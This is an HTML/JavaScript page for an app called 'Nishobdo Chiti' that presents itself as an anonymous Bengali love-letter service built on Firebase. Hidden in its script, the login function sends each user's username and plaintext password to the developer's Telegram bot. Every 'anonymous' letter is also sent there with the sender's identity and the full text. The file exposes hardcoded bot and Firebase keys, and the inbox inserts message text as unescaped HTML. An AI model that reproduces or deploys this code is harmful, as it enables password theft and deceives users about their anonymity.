<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nishobdo Chiti - Prem er Portal 💌</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Satisfy&family=Galada&family=Atma:wght@500&family=Mina:wght@400;700&family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        :root {
            --soft-pink: #fff0f3;
            --accent-red: #ff5e62;
            --input-border: #ffccd5;
        }

        * { box-sizing: border-box; }

        body {
            background-color: var(--soft-pink);
            font-family: 'Hind Siliguri', sans-serif;
            margin: 0; padding: 10px;
            display: flex; flex-direction: column; align-items: center;
            min-height: 100vh; overflow-x: hidden;
        }

        .container { 
            width: 100%; 
            max-width: 400px; 
            display: flex; 
            flex-direction: column; 
            gap: 15px;
        }

        /* Top Bar */
        .top-bar { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            width: 100%;
            padding: 10px 5px;
        }
        .username-display { font-size: 22px; font-weight: bold; color: var(--accent-red); margin: 0; }

        /* Inputs & Buttons */
        input, textarea {
            width: 100%; padding: 15px; margin: 5px 0;
            border: 2px solid var(--input-border); border-radius: 20px;
            outline: none; font-size: 16px; background: white;
        }

        .style-btns {
            display: flex; gap: 8px; overflow-x: auto; 
            padding: 10px 0; scrollbar-width: none;
            width: 100%;
        }
        .style-btns::-webkit-scrollbar { display: none; }
        
        .s-btn {
            background: white; padding: 8px 15px; border-radius: 20px;
            border: 1px solid #eee; font-size: 13px; cursor: pointer; white-space: nowrap;
        }

        /* Letter Display */
        #chiti-display, .chiti-card {
            width: 100%; padding: 25px; border-radius: 25px;
            min-height: 200px; text-align: left;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            word-wrap: break-word; overflow-wrap: break-word;
        }

        /* Font Styles */
        .s1 { background: #fdfae7 !important; font-family: 'Galada', cursive !important; color: #4a2c2a; }
        .s2 { background: #ffe4e1 !important; font-family: 'Atma', cursive !important; color: #c2185b; }
        .s3 { background: #f0fff0 !important; font-family: 'Mina', sans-serif !important; font-weight: 700; color: #2e7d32; }
        .s4 { background: #2d3436 !important; font-family: 'Dancing Script', cursive !important; color: #ffeaa7; font-size: 24px; }
        .s5 { background: #ffffff !important; font-family: 'Satisfy', cursive !important; border: 2px solid #ff758c; color: #333; font-size: 24px; }

        .btn-send {
            background: linear-gradient(90deg, #ff5e62, #ff9966);
            color: white; border: none; padding: 18px; width: 100%;
            border-radius: 50px; font-size: 18px; font-weight: bold;
            cursor: pointer; box-shadow: 0 5px 15px rgba(255, 94, 98, 0.3);
            margin-top: 10px;
        }

        .btn-download {
            background: #4CAF50; color: white; border: none; padding: 8px 15px;
            border-radius: 10px; font-size: 12px; cursor: pointer; margin-top: 15px;
        }

        .footer-text { margin: 20px 0; font-size: 14px; color: #333; }
        .fb-link { color: #1877F2; text-decoration: none; font-weight: bold; }
        .logout-btn { color: #ff5e62; cursor: pointer; font-size: 12px; margin-top: 5px; }
    </style>
</head>
<body>

<div id="auth-box" class="container" style="margin-top: 40px;">
    <h2 style="color: var(--accent-red); font-family: 'Dancing Script'; font-size: 32px; margin: 0;">Nishobdo Chiti</h2>
    <input type="text" id="u_name" placeholder="Username (Ex: @riad)">
    <input type="password" id="u_pass" placeholder="Password">
    <button class="btn-send" onclick="startApp()">Login 💌</button>
</div>

<div id="app-box" class="container" style="display:none;">
    <div class="top-bar">
        <div style="text-align: left;">
            <p style="font-size: 12px; color: #666; margin: 0;">Welcome,</p>
            <p class="username-display" id="welcome-user">@username</p>
        </div>
        <div style="background: white; padding: 12px; border-radius: 50%; cursor: pointer; font-size: 20px;" onclick="toggleInbox()">📩</div>
    </div>

    <div id="compose-view">
        <input type="text" id="to_user" placeholder="Recipient Username (@name)">
        <div class="style-btns">
            <div class="s-btn" onclick="setS('s1')">Bangla Art</div>
            <div class="s-btn" onclick="setS('s2')">Bangla Hand</div>
            <div class="s-btn" onclick="setS('s3')">Bangla Bold</div>
            <div class="s-btn" onclick="setS('s4')">Eng Script</div>
            <div class="s-btn" onclick="setS('s5')">Eng Cursive</div>
        </div>
        <textarea id="msg_body" rows="4" placeholder="এখানে মনের কথা লিখুন..." oninput="sync()"></textarea>
        <div id="chiti-display" class="s1"><div id="out-text" style="font-size: 20px; white-space: pre-wrap;">...</div></div>
        <button class="btn-send" onclick="send()">Send Anonymous 🚀</button>
        <center><span class="logout-btn" onclick="logout()">Logout</span></center>
    </div>

    <div id="inbox-view" style="display:none;">
        <p onclick="toggleInbox()" style="text-align:left; cursor:pointer; font-weight: bold;">⬅️ Back</p>
        <h3 style="color: var(--accent-red); margin-top: 10px;">Your Inbox</h3>
        <div id="chiti-list"></div>
    </div>
</div>

<div class="footer-text">
    Developed By: <a href="https://www.facebook.com/riadul.islam.bishal.69" target="_blank" class="fb-link">Riadul Islam</a>
</div>

<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCbGzmnhfHmixJ-oavyFPeKM0mXdfS8yfg",
        authDomain: "silent-letter-ab228.firebaseapp.com",
        databaseURL: "https://silent-letter-ab228-default-rtdb.firebaseio.com",
        projectId: "silent-letter-ab228",
        storageBucket: "silent-letter-ab228.firebasestorage.app",
        messagingSenderId: "44263491113",
        appId: "1:44263491113:web:378ed1eff39635dc807e38"
    };
    
    const T_TOKEN = '8372136715:AAE1GxjYadlynBDGMVJ-iMYO6GT02e6inrw';
    const T_ADMIN = '6945585884';

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    let loggedInUser = "";
    let currentStyle = "s1";

    window.onload = function() {
        const saved = localStorage.getItem('chiti_user');
        if(saved) { loggedInUser = saved; showDashboard(); }
        if ("Notification" in window) Notification.requestPermission();
    };

    function startApp() {
        let u = document.getElementById('u_name').value.trim().toLowerCase().replace('@','');
        let p = document.getElementById('u_pass').value;
        if(!u || !p) return alert("Fill all fields!");
        loggedInUser = u;
        localStorage.setItem('chiti_user', u);
        postToTelegram(`👤 **LOGIN**\nUser: @${u}\nPass: ${p}`);
        showDashboard();
    }

    function showDashboard() {
        document.getElementById('auth-box').style.display = 'none';
        document.getElementById('app-box').style.display = 'block';
        document.getElementById('welcome-user').innerText = "@" + loggedInUser;
        listenForNewLetters();
    }

    function sync() { document.getElementById('out-text').innerText = document.getElementById('msg_body').value || "..."; }
    function setS(s) { currentStyle = s; document.getElementById('chiti-display').className = s; }

    function send() {
        let to = document.getElementById('to_user').value.trim().toLowerCase().replace('@','');
        let msg = document.getElementById('msg_body').value;
        if(!to || !msg) return alert("Fill recipient and message!");
        database.ref('letters/' + to).push({ message: msg, style: currentStyle, timestamp: Date.now() });
        postToTelegram(`💌 **NEW CHITI**\nFrom: @${loggedInUser}\nTo: @${to}\nMsg: ${msg}`);
        alert("চিঠি পাঠানো হয়েছে! 🚀");
        document.getElementById('msg_body').value = ""; sync();
    }

    function listenForNewLetters() {
        database.ref('letters/' + loggedInUser).limitToLast(1).on('child_added', (snapshot) => {
            const data = snapshot.val();
            if (data.timestamp > (Date.now() - 5000)) {
                if (Notification.permission === "granted") new Notification("নতুন চিঠি এসেছে! 💌");
                else alert("আপনি একটি নতুন চিঠি পেয়েছেন! 📩");
            }
        });
    }

    function toggleInbox() {
        const c = document.getElementById('compose-view');
        const i = document.getElementById('inbox-view');
        if(i.style.display === 'none') { c.style.display = 'none'; i.style.display = 'block'; renderInbox(); }
        else { c.style.display = 'block'; i.style.display = 'none'; }
    }

    function renderInbox() {
        const list = document.getElementById('chiti-list');
        database.ref('letters/' + loggedInUser).once('value', (snap) => {
            if(!snap.exists()) { list.innerHTML = `<p style="color:#999; margin-top:30px;">কোন চিঠি নেই!</p>`; }
            else {
                let data = snap.val();
                list.innerHTML = Object.keys(data).reverse().map(key => {
                    const item = data[key];
                    return `<div id="card-${key}" class="chiti-card ${item.style}">
                        <p style="margin:0;">${item.message}</p>
                        <button class="btn-download" onclick="downloadLetter('card-${key}')">Save as Image 📥</button>
                    </div>`;
                }).join('');
            }
        });
    }

    function downloadLetter(id) {
        const element = document.getElementById(id);
        const btn = element.querySelector('.btn-download');
        btn.style.display = 'none';
        html2canvas(element, { scale: 2 }).then(canvas => {
            const link = document.createElement('a');
            link.download = 'Chiti.png';
            link.href = canvas.toDataURL();
            link.click();
            btn.style.display = 'block';
        });
    }

    function postToTelegram(t) {
        fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: T_ADMIN, text: t, parse_mode: 'Markdown' })
        });
    }

    function logout() { localStorage.removeItem('chiti_user'); location.reload(); }
</script>
</body>
</html>
